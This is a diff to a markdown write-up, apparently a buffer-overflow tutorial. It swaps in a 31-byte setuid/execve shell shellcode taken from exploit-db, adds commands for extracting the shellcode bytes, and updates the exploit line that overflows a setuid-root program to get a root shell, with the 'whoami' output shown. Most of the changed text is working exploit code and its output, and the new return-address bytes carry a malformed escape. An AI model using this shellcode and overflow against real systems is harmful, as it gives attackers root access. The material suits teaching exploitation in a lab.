@@ -253,7 +253,19 @@ We got our exploit working.
 
 #### Extra bits ####
 
-Using the shellcode from https://www.exploit-db.com/exploits/13320, (48 bytes)
+Using the shellcode from https://www.exploit-db.com/exploits/41498, extract to shellcode.asm
+
+```
+nasm -f elf64 -o shellcode.o shellcode.asm
+ld -o shellcode shellcode.o
+printf '\\x' && objdump -d shellcode | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
+```
+
+The resulting shellcode is 31 bytes long:
+
+```
+"\x31\xff\x57\x6a\x69\x58\x48\xbb\x5e\xc4\xd2\xdc\x5e\x5e\xe6\xd0\x0f\x05\x48\xd1\xcb\xb0\x3b\x53\x87\xf7\x54\x99\x5f\x0f\x05"
+```
 
 And 
 
@@ -262,15 +274,15 @@ chmod +s vuln
 sudo chown root:root vuln
 ```
 
-We can atain root:
+We can attain root:
 
 ```
-./vuln $(python -c 'print "\x90" * (524-48-30+2) + "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"  + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
+./vuln $(python -c 'print "\x90" * (524-31-30+2) + "\x31\xff\x57\x6a\x69\x58\x48\xbb\x5e\xc4\xd2\xdc\x5e\x5e\xe6\xd0\x0f\x05\x48\xd1\xcb\xb0\x3b\x53\x87\xf7\x54\x99\x5f\x0f\x05" + "\x7f\xffxff\xff\xde\xad"[::-1] * 5  ')
 # whoami
 root
 ```
 
-Thank you for getting to this point.
+_Thank you for getting to this point._
 
 References
 
